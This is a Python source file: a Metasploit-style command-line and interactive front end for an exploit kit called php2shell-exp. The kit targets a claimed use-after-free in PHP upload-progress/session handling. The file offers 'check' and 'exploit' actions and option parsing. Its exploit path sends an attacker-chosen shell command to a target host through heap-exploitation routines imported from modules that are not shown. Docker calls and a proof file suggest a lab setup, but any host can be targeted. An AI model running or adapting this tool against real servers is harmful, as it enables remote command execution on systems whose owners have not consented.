#!/usr/bin/env python3
"""p2s.py -- Metasploit-style entrypoint for php2shell-exp.

    msf6 > use exploit/php2shell/109619
    msf6 exploit(php2shell/109619) > show options
    msf6 exploit(php2shell/109619) > set RHOSTS 127.0.0.1
    msf6 exploit(php2shell/109619) > set RPORT 19126
    msf6 exploit(php2shell/109619) > set TARGET 8.4.26
    msf6 exploit(php2shell/109619) > check
    msf6 exploit(php2shell/109619) > exploit

Non-interactive:
    python3 p2s.py -x exploit/php2shell/109619 -o RHOSTS=127.0.0.1 \
        -o RPORT=19126 -o TARGET=8.4.26 -o CMD=id
    python3 p2s.py --rhost 127.0.0.1 --rport 19126 --target 8.4.26 --cmd id
    python3 p2s.py --resource p2s.rc

TARGET only selects a profile in profiles/.  Every offset and piece of heap
geometry comes from that profile (and symbols.py); this file never carries
version constants.
"""

from __future__ import annotations

import argparse
import json
import os
import shlex
import subprocess
import sys
import time
import urllib.parse

import chain as C
import profile as P
import symbols as S

REPO = os.path.dirname(os.path.abspath(__file__))
LOG_DIR = os.path.join(REPO, "logs")
PROFILE_DIR = os.path.join(REPO, "profiles")

MODULES = {
    "exploit/php2shell/109619": "RCE via PHP upload-progress/session UAF (CVE-2026-109619)",
    "auxiliary/php2shell/109618": "leak/check only (CVE-2026-109618); never executes a command",
}

OPTIONS = [
    dict(name="RHOSTS", type="string", required=True, default=None, desc="target host"),
    dict(name="RPORT", type="int", required=True, default=19126, desc="target port"),
    dict(name="TARGET", type="enum", required=True, default="8.4.26", desc="version profile (show targets)"),
    dict(name="CMD", type="string", required=False, default="id", desc="command (<=14B; long commands: sh</out/c)"),
    dict(name="PAYLOAD", type="string", required=False, default="cmd/unix/generic", desc="payload"),
    dict(name="PROFILE", type="string", required=False, default=None, desc="profile path override"),
    dict(name="URL", type="string", required=False, default=None, desc="full URL override"),
    dict(name="TIMEOUT", type="float", required=False, default=40.0, desc="socket timeout seconds"),
    dict(name="RETRIES", type="int", required=False, default=3, desc="stage retries"),
    dict(name="VERBOSE", type="bool", required=False, default=True, desc="verbose output"),
    dict(name="PROOF_FILE", type="string", required=False, default="/out/p1", desc="in-container proof path"),
]
BY_NAME = {o["name"]: o for o in OPTIONS}


class OptionError(Exception):
    pass


def targets() -> list[str]:
    if not os.path.isdir(PROFILE_DIR):
        return []
    return sorted(f[:-5] for f in os.listdir(PROFILE_DIR) if f.endswith(".json"))


def parse_bool(value: str) -> bool:
    v = value.strip().lower()
    if v in ("1", "true", "yes", "on"):
        return True
    if v in ("0", "false", "no", "off"):
        return False
    raise OptionError(f"not a boolean: {value!r}")


def coerce(name: str, value):
    spec = BY_NAME[name]
    if spec["type"] == "int":
        try:
            return int(str(value), 0)
        except ValueError:
            raise OptionError(f"{name} must be an integer, got {value!r}")
    if spec["type"] == "float":
        try:
            return float(value)
        except ValueError:
            raise OptionError(f"{name} must be a number, got {value!r}")
    if spec["type"] == "bool":
        return parse_bool(str(value))
    return str(value)


class Module:
    def __init__(self, path: str):
        if path not in MODULES:
            raise OptionError(f"unknown module {path!r}")
        self.path = path
        self.options = {o["name"]: o["default"] for o in OPTIONS}

    @property
    def short(self) -> str:
        return self.path.split("/", 1)[1]

    def set(self, name: str, value) -> None:
        name = name.upper()
        if name not in BY_NAME:
            raise OptionError(f"unknown option {name}")
        value = coerce(name, value)
        if name == "TARGET":
            avail = targets()
            if value not in avail:
                raise OptionError(f"TARGET must be one of {', '.join(avail)}")
        if name == "RPORT" and not (1 <= value <= 65535):
            raise OptionError("RPORT out of range")
        if name == "TIMEOUT" and value <= 0:
            raise OptionError("TIMEOUT must be > 0")
        if name == "RETRIES" and value < 1:
            raise OptionError("RETRIES must be >= 1")
        if name == "PAYLOAD" and value != "cmd/unix/generic":
            raise OptionError("only cmd/unix/generic is implemented")
        if name == "PROOF_FILE" and not value.startswith("/"):
            raise OptionError("PROOF_FILE must be an absolute in-container path")
        self.options[name] = value

    def show_options(self) -> None:
        print(f"Module: {self.path}")
        print(f"{'Name':<12}{'Current':<22}{'Required':<10}{'Type':<8}Description")
        print("-" * 92)
        for spec in OPTIONS:
            name = spec["name"]
            cur = self.options[name]
            cur_s = "-" if cur is None or cur == "" else str(cur)
            print(f"{name:<12}{cur_s:<22}{'yes' if spec['required'] else 'no':<10}"
                  f"{spec['type']:<8}{spec['desc']}")

    def show_targets(self) -> None:
        print(f"{'TARGET':<12}{'IMAGE':<26}{'DEFAULT URL'}")
        print("-" * 72)
        for t in targets():
            try:
                data = P.load(t)
                print(f"{t:<12}{data.get('image','-'):<26}{data.get('url','-')}")
            except SystemExit:
                print(f"{t:<12}{'<invalid profile>':<26}-")

    # ---------------- profile / target ----------------
    def profile(self) -> dict:
        target = self.options["TARGET"]
        if self.options.get("PROFILE"):
            with open(self.options["PROFILE"], "r", encoding="utf-8") as f:
                prof = json.load(f)
        else:
            prof = P.load(target)
        host = self.options["RHOSTS"]
        port = self.options["RPORT"]
        if self.options.get("URL"):
            prof["url"] = self.options["URL"]
        else:
            if not host:
                raise OptionError("RHOSTS is required (or set URL)")
            path = urllib.parse.urlsplit(prof.get("url", "/index.php")).path or "/index.php"
            prof["url"] = f"http://{host}:{port}{path}"
        prof["proof"]["file"] = self.options["PROOF_FILE"]
        return prof

    def _prepare(self) -> tuple[dict, dict]:
        prof = self.profile()
        host = urllib.parse.urlsplit(prof["url"]).hostname or ""
        if host in ("127.0.0.1", "localhost") and not self.options.get("PROFILE"):
            try:
                C.ensure_up(prof["target"])
            except SystemExit:
                pass
        syms = C.load_symbols(prof)
        return prof, syms

    # ---------------- actions ----------------
    def check(self) -> int:
        try:
            prof, syms = self._prepare()
        except (OptionError, SystemExit) as e:
            print(f"[-] check: {e}")
            return 2
        leak = prof["heap"].get("leak", "split")
        target = prof["target"]
        if leak == "combined":
            print(f"[?] {prof['url']} ({target}): unknown - combined leak profile is not "
                  f"checkable without executing the chain")
            return 3
        ch = C.Chain(prof, syms, verbose=bool(self.options["VERBOSE"]),
                     timeout=float(self.options["TIMEOUT"]))
        try:
            ch.rotate()
            chunk = ch.stage1()
        except Exception as e:  # noqa: BLE001 - network/target errors are undecidable
            print(f"[?] {prof['url']} ({target}): unknown - {e}")
            return 3
        if chunk:
            print(f"[+] {prof['url']} ({target}): vulnerable - stage1 heap leak chunk=0x{chunk:x}")
            return 0
        print(f"[-] {prof['url']} ({target}): not vulnerable - stage1 leak failed")
        return 1

    def exploit(self) -> int:
        if self.path.startswith("auxiliary/"):
            print("[!] auxiliary module: check only (no command execution)")
            return self.check()
        try:
            prof, syms = self._prepare()
        except (OptionError, SystemExit) as e:
            print(f"[-] exploit: {e}")
            return 2
        cmd = str(self.options["CMD"])
        proof_file = str(self.options["PROOF_FILE"])
        if any(ch in cmd for ch in "<>|&"):
            wire = cmd
        else:
            wire = f"{cmd}>{proof_file}"
        if len(wire.encode()) > C.MAX_CMD:
            print(f"[-] CMD is {len(wire)} bytes after redirect; the 167-byte carrier "
                  f"allows {C.MAX_CMD}. Use a script: sh</out/c")
            return 2
        prof["proof"]["cmd"] = wire
        os.makedirs(LOG_DIR, exist_ok=True)
        log_path = os.path.join(LOG_DIR, f"p2s-{prof['target']}-{time.strftime('%Y%m%dT%H%M%S')}.log")
        C.log(f"[*] module {self.path}")
        C.log(f"[*] target {prof['url']} profile={prof['target']} cmd={wire!r}")
        C.log(f"[*] log {log_path}")
        try:
            subprocess_run(["docker", "exec", prof["container"], "rm", "-f", proof_file])
        except Exception:
            pass
        ch = C.Chain(prof, syms, verbose=bool(self.options["VERBOSE"]),
                     timeout=float(self.options["TIMEOUT"]))
        tee = Tee(log_path)
        old_stdout = sys.stdout
        sys.stdout = tee
        try:
            rc = ch.run(retries=int(self.options["RETRIES"]))
        finally:
            sys.stdout = old_stdout
            tee.close()
        proof = ch.read_proof()
        if rc == 0 and proof:
            C.log(f"[+] PROOF: {proof}")
            C.log(f"[+] log: {log_path}")
            return 0
        C.log("[-] exploit failed (no proof)")
        C.log(f"[-] log: {log_path}")
        return 1


def subprocess_run(argv: list[str]) -> None:
    subprocess.run(argv, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


class Tee:
    def __init__(self, path: str):
        self.file = open(path, "w", encoding="utf-8")
        self.term = sys.__stdout__

    def write(self, data: str) -> int:
        self.file.write(data)
        self.file.flush()
        return self.term.write(data)

    def flush(self) -> None:
        self.file.flush()
        self.term.flush()

    def close(self) -> None:
        self.file.close()


def execute_line(shell: "Shell", line: str) -> int:
    """Run one shell command; returns an exit code (0 for non-action commands)."""
    try:
        argv = shlex.split(line)
    except ValueError as e:
        print(f"[-] {e}")
        return 2
    if not argv:
        return 0
    cmd, args = argv[0].lower(), argv[1:]
    if cmd in ("exit", "quit"):
        raise SystemExit(0)
    if cmd == "use":
        if not args:
            print("[-] usage: use <module>")
            return 2
        return shell.use(args[0])
    if cmd == "back":
        shell.module = None
        return 0
    if cmd == "show":
        if not shell.module:
            print("[-] no module selected")
            return 2
        if args and args[0].lower() in ("options", "opts"):
            shell.module.show_options()
            return 0
        if args and args[0].lower() == "targets":
            shell.module.show_targets()
            return 0
        print("[-] usage: show options | show targets")
        return 2
    if cmd == "set":
        if not shell.module:
            print("[-] no module selected")
            return 2
        if len(args) < 2:
            print("[-] usage: set <OPTION> <value>")
            return 2
        return shell.set_option(args[0], " ".join(args[1:]))
    if cmd == "check":
        if not shell.module:
            print("[-] no module selected")
            return 2
        return shell.run_action("check")
    if cmd in ("exploit", "run"):
        if not shell.module:
            print("[-] no module selected")
            return 2
        return shell.run_action("exploit")
    if cmd == "help":
        print("use <module> | show options | show targets | set <opt> <val> | "
              "check | exploit | back | exit")
        return 0
    print(f"[-] unknown command {cmd!r} (help)")
    return 2


class Shell:
    def __init__(self) -> None:
        self.module: Module | None = None

    def use(self, path: str, quiet: bool = False) -> int:
        try:
            self.module = Module(path)
        except OptionError as e:
            print(f"[-] {e}")
            return 2
        if not quiet:
            print(f"[*] Using configured module {path}")
        return 0

    def set_option(self, name: str, value: str) -> int:
        try:
            self.module.set(name, value)
        except OptionError as e:
            print(f"[-] {e}")
            return 2
        print(f"{name.upper()} => {self.module.options[name.upper()]}")
        return 0

    def run_action(self, action: str) -> int:
        assert self.module is not None
        rc = self.module.exploit() if action == "exploit" else self.module.check()
        return rc

    def prompt(self) -> str:
        if self.module:
            return f"msf6 {self.module.short} > "
        return "msf6 > "

    def loop(self) -> int:
        last = 0
        while True:
            try:
                line = input(self.prompt())
            except EOFError:
                print()
                return last
            except KeyboardInterrupt:
                print()
                return last
            rc = execute_line(self, line)
            if rc:
                last = rc


def apply_cli_overrides(module: Module, args) -> None:
    for item in args.option or []:
        if "=" not in item:
            raise OptionError(f"-o expects NAME=VALUE, got {item!r}")
        name, value = item.split("=", 1)
        module.set(name, value)
    if args.rhost is not None:
        module.set("RHOSTS", args.rhost)
    if args.rport is not None:
        module.set("RPORT", args.rport)
    if args.target is not None:
        module.set("TARGET", args.target)
    if args.cmd is not None:
        module.set("CMD", args.cmd)


def run_resource(shell: Shell, path: str) -> int:
    last = 0
    with open(path, "r", encoding="utf-8") as f:
        for raw in f:
            line = raw.strip()
            if not line or line.startswith("#"):
                continue
            try:
                rc = execute_line(shell, line)
            except SystemExit:
                return last
            if rc not in (0, None):
                last = rc
    return last


def main(argv: list[str] | None = None) -> int:
    ap = argparse.ArgumentParser(description="php2shell-exp msf-style driver",
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("-x", "--execute", dest="module", default="")
    ap.add_argument("-o", "--option", action="append", default=[], metavar="NAME=VALUE")
    ap.add_argument("--rhost", default=None)
    ap.add_argument("--rport", type=int, default=None)
    ap.add_argument("--target", default=None)
    ap.add_argument("--cmd", default=None)
    ap.add_argument("--resource", default=None)
    ap.add_argument("--list-modules", action="store_true")
    args = ap.parse_args(argv)

    if args.list_modules:
        for name, desc in MODULES.items():
            print(f"{name:<32}{desc}")
        return 0

    shell = Shell()
    try:
        if args.resource:
            # Overrides apply before the resource script; a `use` inside the
            # script still wins for the module, options are kept per module.
            if any(v is not None for v in (args.rhost, args.rport, args.target, args.cmd)) or args.option:
                shell.use("exploit/php2shell/109619", quiet=True)
                apply_cli_overrides(shell.module, args)
            return run_resource(shell, args.resource)

        if args.module:
            rc = shell.use(args.module)
            if rc:
                return rc
            apply_cli_overrides(shell.module, args)
            return shell.run_action("exploit" if "exploit" in args.module else "check")

        if any(v is not None for v in (args.rhost, args.rport, args.target, args.cmd)):
            shell.use("exploit/php2shell/109619")
            apply_cli_overrides(shell.module, args)
            return shell.run_action("exploit")

        if sys.stdin.isatty():
            return shell.loop()
        return run_resource(shell, "/dev/stdin")
    except OptionError as e:
        print(f"[-] {e}")
        return 2
    except KeyboardInterrupt:
        return 130


if __name__ == "__main__":
    sys.exit(main())
